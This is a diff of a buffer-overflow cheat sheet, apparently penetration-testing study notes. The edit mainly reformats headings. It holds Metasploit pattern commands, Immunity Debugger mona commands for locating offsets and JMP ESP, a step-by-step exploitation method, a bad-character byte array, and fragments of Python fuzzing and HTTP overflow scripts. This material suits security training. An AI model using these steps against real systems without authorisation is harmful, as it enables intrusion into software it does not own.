@@ -1,16 +1,14 @@
 Buffer OverFlow
 
-##########################################################################
-##BUFFER OVERFLOW								##
-##########################################################################
-// BUFFER OVERFLOW COMMANDS
+BUFFER OVERFLOW COMMANDS
 msf-pattern_create -l 4000
 msf-pattern_offset -l 4000 -q 39794338
 !mona modules
 !mona find -s “\xFF\xE4” –m “<MODULE>”
 
-// BUFFER OVERFLOW METHODOLOGY
-# https://www.thecybermentor.com/buffer-overflows-made-easy
+BUFFER OVERFLOW METHODOLOGY
+https://www.thecybermentor.com/buffer-overflows-made-easy
+
 Steps:
 	1. Crash The Application: Send "A"*<NUMBER>
 	2. Find EIP: Replace "A" w/ pattern_create.rb -l LENGTH
@@ -20,10 +18,11 @@ Steps:
 	6. Generate Shell Code
 Exploit
 
-\x00 is bydefault badchar 
+"\x00" is bydefault badchar 
 
-// BADCHARS
-badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+BADCHARS
+
+badchars=( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
 "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
 "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
@@ -40,7 +39,7 @@ badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
-// IMMUNITY DEBUGGER MONA COMMANDS
+IMMUNITY DEBUGGER MONA COMMANDS
 !mona findmsp (find offset when app crashes)
 !mona pattern_offset eip
 !mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin
@@ -48,7 +47,7 @@ badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 !mona jmp -r esp
 !mona jmp -r esp -cpb '\x00\x0a\x0d'
 
-// BUFFER OVERFLOW FUZZING SCRIPT
+BUFFER OVERFLOW FUZZING SCRIPT
 #!/usr/bin/python
 import socket
 RHOST = ""
@@ -59,7 +58,7 @@ s.connect((RHOST, RPORT))
 print "Sending buf"
 s.send(buf + '\n')
 
-// BUFFER OVERFLOW OVER HTTP SCRIPT
+BUFFER OVERFLOW OVER HTTP SCRIPT
 except 
 
 		content = "username=" + inputBuffer + "&password=A"
